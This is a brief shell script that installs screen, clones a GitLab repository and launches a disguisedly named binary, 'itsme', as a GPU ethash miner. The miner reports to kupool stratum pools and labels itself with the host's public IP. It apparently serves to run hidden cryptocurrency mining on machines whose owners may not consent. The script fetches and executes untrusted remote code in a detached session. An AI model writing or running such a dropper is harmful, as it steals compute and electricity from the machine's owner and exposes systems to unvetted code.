#!/bin/sh
apt update
apt-get install zip unzip
apt install screen -y
screen -dmS harukan.sh 65 75
git clone https://gitlab.com/taufiqurrohmanmaz/sainame127.git
cd sainame127
chmod +x itsme
ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && ./itsme -a ethash -w berkah.001 -p stratum+tcp://ethash.kupool.com:8888 stratum+tcp://ethash.kupool.com:1800 -r $ip --nvidia 1
